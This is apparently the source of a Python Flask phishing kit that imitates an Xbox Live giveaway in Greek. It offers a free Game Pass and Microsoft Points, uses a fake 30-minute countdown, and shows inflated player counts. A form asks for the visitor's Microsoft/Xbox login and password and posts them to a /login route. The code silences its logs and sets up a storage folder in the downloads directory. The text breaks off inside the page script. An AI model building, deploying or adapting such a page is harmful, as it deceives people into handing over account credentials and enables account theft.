import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'xbox-greek-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Xbox Live Ελλάδα")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['xb_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <title>Xbox Live - Δωρεάν Game Pass & Πόντοι Microsoft</title>
        <style>
            :root {
                --xbox-green: #107C10;
                --xbox-dark: #000000;
                --xbox-light: #F5F5F5;
                --xbox-blue: #0078D4;
                --xbox-gold: #FFB900;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #000000 0%, #107C10 100%);
                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-text-size-adjust: 100%;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: rgba(0, 0, 0, 0.85);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 500px;
                padding: 20px;
                border-radius: 8px;
                text-align: center;
                border: 2px solid #107C10;
                box-shadow: 0 8px 32px rgba(16, 124, 16, 0.3);
                margin: 0 auto;
            }
            
            .xbox-logo {
                font-size: 48px;
                font-weight: 800;
                color: white;
                margin-bottom: 15px;
                letter-spacing: 1px;
            }
            
            .gamepass-banner {
                background: linear-gradient(90deg, #107C10 0%, #5FAF5F 50%, #107C10 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                border: 2px solid #5FAF5F;
                animation: xboxGlow 2s infinite;
            }
            
            @keyframes xboxGlow {
                0% { box-shadow: 0 0 15px rgba(16, 124, 16, 0.5); }
                50% { box-shadow: 0 0 30px rgba(95, 175, 95, 0.8); }
                100% { box-shadow: 0 0 15px rgba(16, 124, 16, 0.5); }
            }
            
            .points-badge {
                background: linear-gradient(90deg, #FFB900 0%, #FFD966 50%, #FFB900 100%);
                color: #000000;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                font-weight: 900;
                font-size: 24px;
                border: 2px solid #FFD966;
            }
            
            .giveaway-container {
                background: rgba(16, 124, 16, 0.1);
                border: 2px dashed var(--xbox-green);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 700;
            }
            
            .subtitle {
                color: #CCCCCC;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #FF4C4C;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Consolas', 'Cascadia Code', monospace;
                font-size: 22px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
            }
            
            .games-showcase {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-card {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
            }
            
            .game-card:hover {
                border-color: var(--xbox-green);
                background: rgba(16, 124, 16, 0.1);
                transform: translateY(-3px);
            }
            
            .game-image {
                width: 100%;
                height: 100px;
                background: linear-gradient(45deg, #000000, #333333);
                border-radius: 6px;
                margin-bottom: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 32px;
                color: #5FAF5F;
            }
            
            .game-title {
                color: white;
                font-weight: 600;
                font-size: 16px;
                margin-bottom: 6px;
            }
            
            .game-price {
                color: #FFB900;
                font-weight: bold;
                font-size: 12px;
            }
            
            .free-tag {
                position: absolute;
                top: 8px;
                right: 8px;
                background: #107C10;
                color: white;
                padding: 3px 6px;
                border-radius: 4px;
                font-size: 10px;
                font-weight: bold;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #CCCCCC;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #333333;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                -webkit-appearance: none;
                appearance: none;
                transition: all 0.3s;
            }
            
            input:focus {
                border-color: var(--xbox-green);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #666666;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 4px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            .login-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 10px 25px rgba(16, 124, 16, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #FFFFFF;
                font-size: 14px;
            }
            
            .benefit-icon {
                color: #FFB900;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                min-width: 20px;
            }
            
            .gamepass-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #107C10, #5FAF5F);
                color: white;
                padding: 5px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #333333;
                padding-top: 15px;
                text-align: center;
            }
            
            .xbox-logo-img {
                width: 100px;
                height: auto;
                margin: 0 auto 15px;
                display: block;
            }
            
            .players-count {
                background: rgba(255, 185, 0, 0.1);
                border: 2px solid var(--xbox-gold);
                border-radius: 8px;
                padding: 10px;
                margin: 15px 0;
                font-size: 13px;
                color: #FFD966;
            }
            
            .console-icons {
                display: flex;
                justify-content: center;
                gap: 12px;
                margin: 12px 0;
                flex-wrap: wrap;
            }
            
            .console-icon {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 8px;
                padding: 10px;
                font-size: 20px;
                width: 50px;
                height: 50px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .region-selector {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #333333;
                border-radius: 4px;
                padding: 12px;
                margin: 12px 0;
                font-size: 14px;
                color: #CCCCCC;
                width: 100%;
                -webkit-appearance: none;
                appearance: none;
            }
            
            /* Mobile-specific adjustments */
            @media (max-width: 480px) {
                body {
                    padding: 10px;
                    min-height: -webkit-fill-available;
                }
                
                .login-box {
                    padding: 15px;
                    width: 100%;
                    max-width: 100%;
                }
                
                .xbox-logo-img {
                    width: 80px;
                }
                
                .gamepass-banner {
                    font-size: 16px;
                    padding: 12px;
                }
                
                .points-badge {
                    font-size: 20px;
                    padding: 12px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
                
                .games-showcase {
                    grid-template-columns: 1fr;
                    gap: 10px;
                }
                
                .game-image {
                    height: 90px;
                    font-size: 28px;
                }
                
                .console-icon {
                    width: 45px;
                    height: 45px;
                    font-size: 18px;
                }
                
                input {
                    padding: 12px;
                    font-size: 16px;
                }
                
                .login-btn {
                    padding: 14px;
                    font-size: 15px;
                }
                
                .benefit-item {
                    font-size: 13px;
                }
            }
            
            @media (max-width: 360px) {
                .points-badge {
                    font-size: 18px;
                }
                
                .gamepass-banner {
                    font-size: 14px;
                }
                
                .console-icons {
                    gap: 8px;
                }
                
                .console-icon {
                    width: 40px;
                    height: 40px;
                }
            }
            
            /* Prevent text selection on mobile */
            .noselect {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
            }
            
            /* Better touch targets */
            button, input, select {
                min-height: 44px;
            }
        </style>
    </head>
    <body class="noselect">
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik05My4xMjUgNTIuMjMzM0M5My4xMjUgNjcuNTEyOCA4MC44NzUgODIuMTY4NCA2My4yNSA4OC41ODI2QzU0Ljg3NSA5MS44MzQ3IDQ4Ljg3NSA5Mi43ODQ2IDQzLjc1IDkyLjc4NDZDNDAuNjI1IDkyLjc4NDYgMzcuNSA5Mi40MTgyIDM0LjM3NSA5MS42ODU0QzI3LjEyNSA4OS44OTE2IDIyLjUgODguNTgyNiAxNi41IDg2LjU5MzhDMTUuMzc1IDg2LjE2MDcgMTQuMjUgODUuNzI3NiAxMi41IDg1LjEwM0MxMS4zNzUgODQuNTY5OSA5LjM3NSA4My42NCA4LjEyNSA4Mi4zMDMxQzcuNSAxNy4wNDE5IDMxLjg3NSAzLjEyNSA0OC4xMjUgMy4xMjVDNjMuMjUgMy4xMjUgNzYuODc1IDEzLjQzMTIgODIuNSAyNy4yMjg4Qzg4LjEyNSAzNy41MDI3IDg4LjEyNSA1MC4xODc1IDgyuNSA2MC4wNjYzQzg3LjM3NSA1OS43MzI4IDkwLjYyNSA1OC4wNjMzIDkzLjEyNSA1Mi4yMzMzWiIgZmlsbD0iIzEwN0MxMCIvPgo8cGF0aCBkPSJNMTQuMjUgNzQuMTY1N0MxNS42MjUgNzQuNDk5MiAxNi41IDc0LjgzMjcgMTguMTI1IDc1LjI2NThDMjMuMjUgNzYuODA5NiAyNy4xMjUgNzcuOTY2OSAzMy43NSA3OS41MTA3QzQ0LjYyNSA4Mi4xNjg0IDUzLjc1IDgyLjUwMiA2MC4zNzUgODAuMzIzMUM2My41IDc5LjQzMDMgNjYuMjUgNzguMTAyMyA3MC4zNzUgNzUuOTUyM0M3NC41IDczLjgwMjMgNzcuMjUgNzIuMzU3OCA4MCA3MC4wMTk4QzgyLjc1IDY3LjY4MTggODUgNjQuNjUyMyA4Ni4yNSA2MC43MjIyQzg3LjUgNTYuNzkyIDg3LjUgNTEuNzcxMiA4Ni4yNSA0Ny4zOTYzQzg1LjM3NSA0NC4xODgyIDg0LjEyNSA0Mi4wMzgyIDgzLjEyNSAzOS44ODgyQzgyLjEyNSAzNy43MzgyIDgxLjUgMzYuMTAzMSA4MS41IDMzLjU4MjZDODEuNSAzMC4zOTM4IDgzLjEyNSAyOC41MTkzIDg1LjM3NSAyNy4yMjg4Qzg3LjYyNSAyNS45MzgzIDkwLjI1IDI1LjgwNTEgOTIuODc1IDI3LjIyODhDOTMuNSAyNy41NjIzIDkzLjc1IDI4LjA5NTQgOTMuNSAyOC41MDI3QzkzLjEyNSAyOS4yOTY1IDkyLjYyNSAzMC4yMzEyIDkyLjEyNSAzMS4wMjVDOTEuNjI1IDMxLjgxODggOTEgMzIuNjc5OSA5MC4zNzUgMzMuMjgwMUM4OC41IDM1LjAzMDggODYuMjUgMzUuOTc0MiA4NC4zNzUgMzcuNTgyN0M4Mi41IDQ1LjM3MTIgNzkuMzc1IDUzLjE2IDc0LjM3NSA2MC4wNjYzQzcwLjM3NSA2NS40NTExIDY1LjYyNSA2OS4wMzEyIDYwLjM3NSA3MS4xNzg3QzU1LjEyNSA3My4zMjYyIDQ5LjM3NSA3My45OTI5IDQzLjc1IDczLjE0OTNDMzguMTI1IDcyLjMwNTcgMzMuMTI1IDcwLjAxOTggMjkuMzc1IDY3LjAwMzVDMjUuNjI1IDYzLjk4NzIgMjMuMTI1IDYwLjI0NTIgMjEuODc1IDU2LjIyMThDMjAuNjI1IDUyLjE5ODQgMjAuNjI1IDQ4LjA0ODYgMjEuODc1IDQ0LjE4ODJDMjMuMTI1IDQwLjMyNzggMjUuNjI1IDM3LjEyNTYgMjkuMzc1IDM0LjM4MDFDMzMuMTI1IDMxLjYzNDcgMzguMTI1IDI5LjQxNTcgNDMuNzUgMjguNTcyMUM0OS4zNzUgMjcuNzI4NSA1NS4xMjUgMjguMzk1MiA2MC4zNzUgMzAuNTQyN0M2NS42MjUgMzIuNjkwMiA3MC4zNzUgMzYuMjcwMyA3NC4zNzUgNDEuNjU1MUM3Ny4yNSA0NS41MTI1IDgwIDUwLjE4NzUgODIuMTI1IDU0LjU1MTdDODAuODc1IDU0Ljc4NTEgNzkuNjI1IDU1LjAxODUgNzguMTI1IDU1LjAxODVDNzYuNjI1IDU1LjAxODUgNzUuMzc1IDU0LjY4NSA3NC4zNzUgNTQuMDE4M0M3My4zNzUgNTMuMzUxNiA3Mi42MjUgNTIuMjIzMyA3Mi42MjUgNTAuNjY2OEM3Mi42MjUgNDkuMTg3NSA3My41IDQ3LjkzMzYgNzUuMzc1IDQ3LjAxODVDNzcuMjUgNDYuMTAzNSA3OS44NzUgNDUuOTcwMyA4Mi4xMjUgNDcuMDYwNEM4Mi42MjUgNDcuMjkzOCA4Mi44NzUgNDcuNzkzOCA4Mi43NSA0OC4zNjA2QzgyLjUgNDkuMjY0OSA4Mi4xMjUgNTAuMjM2NCA4MS42MjUgNTEuMDczNUM4MC41IDQ4LjA0ODYgNzguNzUgNDUuMDUwNyA3Ni4yNSA0Mi4zMTg4QzczLjc1IDM5LjU4NjkgNzAuNSAzNy4xMjU2IDY3LjI1IDM1LjM0NTJDNjQgMzMuNTY0OCA2MC4zNzUgMzIuNDY0MiA1Ni4yNSAzMS45OTc3QzUyLjEyNSAzMS41MzEyIDQ4LjEyNSAzMS43OTggNDQuMzc1IDMyLjgwMjNDNDAuNjI1IDMzLjgwNjYgMzcuMzc1IDM1LjUyMzkgMzQuNzUgMzcuODgxOUMzMi4xMjUgNDAuMjM5OSAzMC4yNSA0My4xNjg0IDI5LjM3NSA0Ni43MzM0QzI4LjUgNTAuMjk4NCAyOC41IDU0LjMyMTggMjkuMzc1IDU3Ljc1NDJDMzAuMjUgNjEuMTg2NiAzMi4xMjUgNjQuMTE1MSAzNC43NSA2Ni40NzMxQzM3LjM3NSA2OC44MzExIDQwLjYyNSA3MC41NDg0IDQ0LjM3NSA3MS41NTI3QzQ4LjEyNSA3Mi41NTcgNTIuMTI1IDcyLjgyMzggNTYuMjUgNzIuMzU3M0M2MCA3MS44OTA4IDYzLjYyNSA3MC43OTAyIDY2Ljg3NSA2OS4wMTYzQzcwLjEyNSA2Ny4yNDI0IDcyLjc1IDY0Ljc5OSA3NS4yNSA2MS42Njk0Qzc3Ljc1IDU4LjUzOTkgNzkuNSA1NS4wMTg1IDgwLjg3NSA1MS4wNzM1QzgwLjg3NSA1MS41NzM1IDgxLjEyNSA1Mi4wNzM1IDgxLjM3NSA1Mi40MDdDODEuNjI1IDUyLjc0MDUgODIuMTI1IDUzLjA3NCA4Mi42MjUgNTMuMDc0QzgzLjc1IDUzLjA3NCA4NC41IDUyLjIyMzMgODQuNSA1MC45NzA4Qzg0LjUgNDkuNzE4MyA4My43NSA0OC41NzAxIDgyLjUgNDcuNzkzNkM4MS4yNSA0Ny4wMTcxIDc5LjYyNSA0Ni43MzM0IDc4LjEyNSA0Ny4xNjY1Qzc2LjYyNSA0Ny41OTk2IDc1LjM3NSA0OC43MjggNzUuMzc1IDUwLjAxODVDNzUuMzc1IDUxLjEwMzUgNzYuMjUgNTIuMDczNSA3Ny42MjUgNTIuNTczNUM3OS4wMDEgNTMuMDczNSA4MC43NTEgNTMuMDczNSA4Mi4xMjUgNTIuMzMzNkM4Mi44NzUgNTIuMDAwMSA4My4yNSA1MS4yMzM0IDgzLjM3NSA1MC4zMzNDODMuMzc1IDQ4LjA0ODYgODEuMjUgNDQuNTE3MyA3Ny42MjUgNDAuMzkzOUM3My4zNzUgMzUuNjU3OSA2Ny41IDMyLjcxMzkgNjAuMzc1IDMxLjI3MDFDNTMuMjUgMjkuODI2MyA0Ni4yNSAzMC40OTMgNDAgMzMuMTUwOEMzMy43NSAzNS44MDg1IDI4LjM3NSA0MC40MTggMjQuODc1IDQ2LjE0NDFDMjEuMzc1IDUxLjg3MDIgMTkuNzUgNTguNTY4NyAyMC42MjUgNjUuNDUxMUMyMS41IDcyLjMzMzUgMjQuODc1IDc5LjEyOSAyOS4zNzUgODQuMDUyN0MzMy44NzUgODguOTc2NCAzOS41IDkyLjAwNiA0NS42MjUgOTIuODQ5NkM1MS43NSA5My42OTI1IDU3LjM3NSA5Mi43ODQ2IDYzLjEyNSA5MC4wODE5QzY4Ljg3NSA4Ny4zNzkyIDczLjM3NSA4My4wMTUxIDc3LjI1IDc3Ljk2NjlDODEuMTI1IDcyLjkxODcgODQuMzc1IDY3LjI0MjQgODYuODc1IDYwLjg0OTlDODcuNzUgNTguNTY4NyA4OC4zNzUgNTYuMzUyMyA4OC42MjUgNTQuMDY3OUM4OC42MjUgNTMuNTM0OCA4OC44NzUgNTMuMDc0IDg5LjM3NSA1Mi44MDcyQzkwLjI1IDIxLjM4MjMgNzEuODc1IDkuNDMxODcgNTEuODc1IDkuNDMxODdDNDAuNjI1IDkuNDMxODcgMjkuNzUgMTUuNTg1NCAyMy41IDI1LjgwNTFDMTcuMjUgMzYuMDI0OCAxNy4yNSA0OS4yODk3IDIzLjUgNTkuNTA5NEMyOC43NSA2Ny42ODE4IDM2LjYyNSA3My40OTkyIDQ2LjEyNSA3NS40MzI2QzUyLjg3NSA3Ni42NDYyIDU4Ljc1IDc1LjI2NTggNjMuNjI1IDcyLjcyODhDNjYuNjI1IDcxLjI4NTEgNjkuMjUgNjkuMzQ4NyA3Mi41IDY3LjU2ODRDNzUuNzUgNjUuNzg4IDc4LjYyNSA2NC4wMDc2IDgxLjEyNSA2MS40MzE5QzgzLjYyNSA1OC44NTYyIDg1LjUgNTUuNDUxMSA4Ni42MjUgNTEuMDczNUM4Ny43NSA0Ni42OTU5IDg3Ljc1IDQxLjkzNTcgODYuNjI1IDM3LjU4MjdDODUuNSAzMy4yMjk3IDgzLjYyNSAyOS43NTA1IDgxLjEyNSAyNy4xNzQ4Qzc4LjYyNSAyNC41OTgxIDc1Ljc1IDIyLjgxNzcgNzIuNSAyMS4wMzczQzY5LjI1IDE5LjI1NjkgNjYuNjI1IDE3LjcxOTkgNjMuNjI1IDE2LjQ3MzFDNjIuNSAxNS45Mzk5IDYxLjEyNSAxNS44MDY3IDU5Ljg3NSAxNi4xNDAyQzU4LjYyNSAxNi40NzM3IDU3LjUgMTcuMzE3MyA1Ni44NzUgMTguNDI0MUM1Ni4yNSAxOS41MzA5IDU2LjEyNSAyMC43NjcyIDU2LjYyNSAyMS43MDg3QzU3LjEyNSAyMi42NTAyIDU4LjEyNSAyMy4zNjkyIDU5LjM3NSAyMy41Njg3QzYxLjYyNSAyNC4wMzUyIDYzLjI1IDI0Ljk3NjcgNjQuNzUgMjYuMDgzNUM2Ni4yNSAyNy4xOTAzIDY3LjUgMjguNjM0MSA2OC41IDMwLjI0MjZDNjkuNSAzMS44NTExIDcwLjM3NSAzMy42MzE1IDcxLjI1IDM1LjQxMTlDNzIuMTI1IDM3LjE5MjMgNzIuODc1IDM5LjAzNjIgNzMuNSA0MC44ODNDNzQuMTI1IDQyLjcyOTggNzQuNjI1IDQ0LjU3NjYgNzUgNDYuMjgwMkM3NS4zNzUgNDcuOTgzOSA3NS42MjUgNDkuNjUwNCA3NS42MjUgNTEuMTcwMUM3NS42MjUgNTIuNjg5OCA3NS4zNzUgNTQuMDY3OSA3NSA1NS4zMDQyQzc0LjYyNSA1Ni41NDA1IDc0IDU3Ljc1MDYgNzMuMzc1IDU4Ljc5MjNDNjkuMzc1IDY1LjEyMTUgNjIuODc1IDY5LjAzMTIgNTUuMzc1IDY5Ljk0NjJDNDcuODc1IDcwLjg2MTIgNDAuNjI1IDY4LjA3MzggMzQuMzc1IDYyLjkzMTNDMjguMTI1IDU3Ljc4ODggMjMuNzUgNTAuNTU1MyAyMi4xMjUgNDIuNDgwNkMyMC41IDQ0LjUxNzMgMjAuNSA0OC4wNDg2IDIyLjEyNSA1Mi45NzAzQzIzLjc1IDU3Ljg5MiAyNy41IDYzLjQxNTMgMzMuMTI1IDY3LjAwMzVDMzguNzUgNzAuNTkxNyA0NS42MjUgNzIuMDg2NCA1Mi4yNSA3MC42ODkzQzU4Ljg3NSA2OS4yOTE1IDY0LjM3NSA2NS4xMjE1IDY3Ljg3NSA1OS4xOTU1QzcwLjEyNSA1NS4yMzE4IDcxLjUgNTAuNTE4NSA3MS42MjUgNDUuNjE5MkM3MS43NSA0MC43MTk5IDcwLjYyNSAzNS45MTEzIDY4LjM3NSAzMS42ODQzQzY2LjEyNSAyNy40NTczIDYyLjg3NSAyMy44NzcyIDU5LjM3NSAyMS4zMTQ5QzU1Ljg3NSAxOC43NTI2IDUyLjEyNSAxNy4xMDUxIDQ4LjM3NSAxNi40NzM3QzQ0LjYyNSAxNS44NDIzIDQxLjEyNSAxNi4zMDg4IDM4LjEyNSAxNy43ODgxQzM1LjEyNSAxOS4yNjc0IDMyLjg3NSAyMS41NjMxIDMxLjYyNSAyNC41NzUyQzMwLjM3NSAyNy41ODczIDMwLjM3NSAzMS4xNjc0IDMxLjYyNSAzNC41NDIzQzMyLjg3NSAzNy45MTczIDM1LjM3NSA0MC44MTM4IDM4Ljc1IDQyLjg4MDhDNDIuMTI1IDQ0Ljk0NzggNDYuMjUgNDYuMTg0MSA1MC4zNzUgNDYuNDE3NkM1NC41IDQ2LjY1MSA1OC42MjUgNDUuODQwOCA2Mi4yNSA0NC4yNDc1QzY1Ljg3NSA0Mi42NTQyIDY4Ljg3NSA0MC4zOTIgNzEuMjUgMzcuNTgyN0M3My42MjUgMzQuNzczNCA3NS4zNzUgMzEuNDIyNCA3Ni41IDI3Ljc2OTFDNzcuNjI1IDI0LjExNTggNzguMTI1IDIwLjI1MzYgNzcuODc1IDE2LjM5MTNDNzcuNjI1IDEyLjUyOSA3Ni42MjUgOC44OTI5NyA3NSA1LjYxODU5QzczLjM3NSAyLjQwMjE0IDcwLjYyNSAwIDY3LjI1IDBDNjMuODc1IDAgNjEuMjUgMi43MDI1NyA2MC41IDcuMDc0MDNDNTkuMzc1IDEzLjcxMTUgNTUuMzc1IDE5LjE0NTcgNDkuMzc1IDIxLjMxNDlDNDMuMzc1IDIzLjQ4NDEgMzYuNzUgMjIuMTgwNiAzMS43NSAxNy43ODgxQzI2Ljc1IDEzLjM5NTYgMjMuNzUgNi4yNzYxMSAyMy43NSAwSDE0LjI1SDE0LjI1QzE0LjI1IDYuODkzMDQgMTcuMjUgMTMuODc5IDIyLjEyNSAxOS42MTdDMjcgMjUuMzU1IDMzLjM3NSAyOS40NzI3IDQwLjM3NSAzMS4yMDEzQzQ3LjM3NSAzMi45Mjk5IDU0LjYyNSAzMi4xNTM0IDYwLjg3NSAyOS4wMzI3QzY3LjEyNSAyNS45MTIgNzEuODc1IDIwLjUyNzQgNzQuMzc1IDE0LjEzNDhDNzYuODc1IDcuNzQyMjUgNzYuODc1IDAuNjE2Mzg5IDc0LjM3NSAwSDY0SDY0QzYxLjc1IDAgNTkuNSAyLjY5MjY0IDU4Ljc1IDcuMDc0MDNDNTcuNjI1IDEyLjU5NzMgNTMuODc1IDE3LjI4MDggNDguNzUgMTkuNDgxNkM0My42MjUgMjEuNjgyNCAzNy43NSAyMC45MTAyIDMzLjEyNSAxNy43ODgxQzI4LjUgMTQuNjY2IDI1LjYyNSA5LjU5NTcgMjUuNjI1IDMuOTU2OTVIMTQuMjVIMTQuMjVDMTQuMjUgMTIuNDEzOSAxOC4xMjUgMjAuNTgwNyAyNC43NSAyNy4wOTYyQzMxLjM3NSAzMy42MTE3IDQwLjI1IDM3Ljk0NjIgNDkuNjI1IDM5LjM0MzBDNTkgNDAuNzM5OCA2OC4zNzUgMzkuMDkyMyA3Ni4yNSAzNC44MDY4Qzg0LjEyNSAzMC41MjEzIDkwLjEyNSAyMy43NjI3IDkzLjEyNSAxNS45MzA4Qzk2LjEyNSA4LjA5ODk2IDk2LjEyNSAtMC41NDA3MjkgOTMuMTI1IDguNDA5NzdWNTIuMjMzM1oiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Xbox Logo" class="xbox-logo-img">
                
                <div class="gamepass-banner">
                    🎮 ΔΩΡΕΑΝ ΧΡΙΣΤΟΥΓΕΝΝΙΑΤΙΚΟ GAME PASS 🎮
                </div>
                
                <div class="points-badge">
                    25,000 ΔΩΡΕΑΝ ΠΟΝΤΟΙ MICROSOFT
                </div>
                
                <div class="console-icons">
                    <div class="console-icon">X</div>
                    <div class="console-icon">S</div>
                    <div class="console-icon">PC</div>
                    <div class="console-icon">☁️</div>
                </div>
                
                <div class="giveaway-container">
                    <h1>Κερδίστε Δωρεάν Game Pass & Πόντοι</h1>
                    <div class="subtitle">
                        Μόνο για τους πρώτους 250 παίκτες! <span class="gamepass-badge">Game Pass Ultimate</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        30:00
                    </div>
                </div>
                
                <div class="players-count">
                    🎯 <strong>98,472,836 ενεργοί παίκτες</strong> - Περιορισμένες θέσεις!
                </div>
                
                <select class="region-selector">
                    <option>Ελλάδα (Ελληνικά)</option>
                    <option>Κύπρος (Ελληνικά)</option>
                    <option>Ευρώπη (Πολλαπλές γλώσσες)</option>
                    <option>Ηνωμένο Βασίλειο (Αγγλικά)</option>
                    <option>Ηνωμένες Πολιτείες (Αγγλικά)</option>
                </select>
                
                <div class="games-showcase">
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">🎮</div>
                        <div class="game-title">Halo Infinite</div>
                        <div class="game-price">$59.99 → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">⚔️</div>
                        <div class="game-title">Forza Horizon 5</div>
                        <div class="game-price">$59.99 → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">🛡️</div>
                        <div class="game-title">Gears 5</div>
                        <div class="game-price">$59.99 → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">🧟</div>
                        <div class="game-title">State of Decay 3</div>
                        <div class="game-price">$69.99 → ΔΩΡΕΑΝ</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        25,000 Πόντοι Microsoft
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        1 Έτος Xbox Game Pass Ultimate
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        4 Δωρεάν Παιχνίδια Xbox
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Πρόσβαση στο Xbox Cloud Gaming
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        EA Play Premium (Συμπεριλαμβάνεται)
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL, ΤΗΛΕΦΩΝΟ, Ή XBOX GAMERTAG</label>
                        <input type="text" name="username" placeholder="Εισάγετε το λογαριασμό σας Microsoft/Xbox" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ</label>
                        <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎮 Λήψη Δωρεάν Game Pass & Πόντων
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ Αυτή η προσφορά Xbox Live λήγει σε 30 λεπτά. Τα οφέλη ενεργοποιούνται εντός 24 ωρών.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 1800; // 30 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'xboxGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Η Προσφορά Λήξει!";
                    countdownElement.style.color = '#FF4C4C';
                }
            }
            
            updateTimer();
            
            // Animate game cards
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach((card, index) => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(20px)';
                
                setTimeout(() => {
